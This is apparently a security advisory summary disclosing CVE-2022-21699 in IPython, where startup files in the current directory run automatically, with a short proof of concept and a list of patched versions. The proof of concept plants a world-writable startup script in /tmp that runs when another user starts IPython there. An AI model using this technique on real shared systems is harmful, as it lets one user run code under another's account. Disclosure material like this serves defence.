summary: "Execution with Unnecessary Privileges in ipython\nWeâ€™d like to disclose an arbitrary\
  \ code execution vulnerability in IPython that stems from IPython executing untrusted files\
  \ in CWD. This vulnerability allows one user to run code as another.\n \nProof of concept\n\
  \nUser1:\n```\nmkdir -m 777 /tmp/profile_default\nmkdir -m 777 /tmp/profile_default/startup\n\
  echo 'print(\"stealing your private secrets\")' > /tmp/profile_default/startup/foo.py\n```\n\
  \nUser2:\n```\ncd /tmp\nipython\n```\n\n \n\nUser2 will see:\n```\nPython 3.9.7 (default,\
  \ Oct 25 2021, 01:04:21)\nType 'copyright', 'credits' or 'license' for more information\n\
  IPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.\nstealing your private\
  \ secrets\n```\n\n\n## Patched release and documentation\n\nSee https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699,\
  \ \n\nVersion 8.0.1, 7.31.1 for current Python version are recommended. \nVersion 7.16.3 has\
  \ also been published for Python 3.6 users, \nVersion 5.11 (source only, 5.x branch on github)\
  \ for older Python versions."
